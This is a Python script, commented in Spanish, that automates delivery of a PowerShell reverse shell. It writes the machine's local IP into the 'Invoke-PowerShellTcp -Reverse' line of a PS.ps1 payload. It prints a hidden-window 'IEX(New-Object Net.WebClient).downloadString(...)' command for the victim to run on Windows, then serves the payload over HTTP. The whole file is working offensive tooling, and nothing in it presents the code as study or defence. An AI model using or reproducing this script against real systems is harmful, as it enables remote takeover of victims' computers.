import os
import re  
import subprocess
import http.server
import socketserver

puerto = 8080  # Declarar la variable puerto aquí

# Función para obtener la IP actual del sistema usando ifconfig
def obtener_ip():
    resultado = subprocess.run(['ifconfig'], capture_output=True, text=True)
    salida = resultado.stdout

    patron_ip = r'inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
    ips = re.findall(patron_ip, salida)

    ips_validas = [ip for ip in ips if not ip.startswith("127.")]

    if ips_validas:
        return ips_validas[0]
    else:
        return None

# Función para leer el archivo .ps1
def leer_ps1(ruta_archivo):
    with open(ruta_archivo, 'r', encoding='utf-8') as archivo:
        contenido = archivo.readlines()  # Lee línea por línea
    return contenido

# Función para obtener la IP en el archivo .ps1
def obtener_ip_archivo(contenido):
    ultima_linea = contenido[-1]
    patron_ip = r'-IPAddress (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
    ip_encontrada = re.search(patron_ip, ultima_linea)
    if ip_encontrada:
        return ip_encontrada.group(1)
    return None

# Función para modificar la última línea del archivo .ps1
def modificar_ultima_linea(contenido, nueva_ip):
    contenido[-1] = f"Invoke-PowerShellTcp -Reverse -IPAddress {nueva_ip} -Port 443\n"
    return contenido

# Función para guardar el archivo modificado
def guardar_ps1(ruta_archivo, nuevo_contenido):
    with open(ruta_archivo, 'w', encoding='utf-8') as archivo:
        archivo.writelines(nuevo_contenido)

# Función para levantar un servidor HTTP en el puerto 5555
def levantar_servidor():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", puerto), handler) as httpd:
        print(f"Servidor levantado en el puerto {puerto}. Ctrl+C para detener.")
        httpd.serve_forever()

# Ejemplo de uso
ruta_archivo = "PS.ps1"

# Obtener la IP actual del sistema
ip_actual = obtener_ip()

if ip_actual:
    # Leer el archivo .ps1
    contenido = leer_ps1(ruta_archivo)

    # Obtener la IP que está en el archivo actualmente
    ip_encontrada = obtener_ip_archivo(contenido)

    # Imprimir la IP encontrada en el archivo
    if ip_encontrada:
        print(f"IP en el archivo: {ip_encontrada}")
    else:
        print("No se encontró una IP en el archivo.")

    # Si la IP en el archivo es diferente a la IP actual, hacer el cambio
    if ip_encontrada != ip_actual:
        # Modificar la última línea con la IP obtenida
        contenido_modificado = modificar_ultima_linea(contenido, ip_actual)

        # Guardar el archivo modificado
        guardar_ps1(ruta_archivo, contenido_modificado)
        print(f"La IP ha sido actualizada a: {ip_actual}")
    else:
        print("La IP en el archivo ya es la misma que la IP actual. No se necesitan cambios.")
    
    print("****************************************EJECUTAR EN WINDOWS**********************************************")
    print(f"powershell -w hidden \"IEX(New-Object Net.WebClient).downloadString('http://{ip_actual}:{puerto}/PS.ps1')\"")
    print("**********************************************************************************************************")
    
    # Levantar servidor HTTP para compartir el archivo .ps1
    levantar_servidor()

else:
    print("No se pudo obtener la IP actual.")
